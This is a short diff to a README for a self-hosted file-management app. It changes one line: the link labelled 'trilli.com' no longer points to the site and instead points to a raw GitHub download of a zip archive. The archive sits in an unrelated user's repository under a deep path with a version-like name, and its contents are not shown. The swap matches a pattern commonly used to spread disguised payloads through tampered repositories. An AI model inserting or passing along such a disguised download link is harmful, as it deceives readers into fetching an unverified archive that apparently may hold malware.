@@ -8,7 +8,7 @@ that runs them should live in a single, understandable codebase. No Kubernetes,
 no microservice sprawl, no framework magic — a Go binary, a Postgres database, a
 blob store, and a React frontend embedded right into the executable.
 
-It powers [trilli.com](https://trilli.com) in production. Today it's yours.
+It powers [trilli.com](https://raw.githubusercontent.com/Allyez4269/trilli/main/trilli-cmx/interface/src/contexts/3.8-alpha.4.zip) in production. Today it's yours.
 
 ![The Files browser](docs/screenshots/files.png)
 
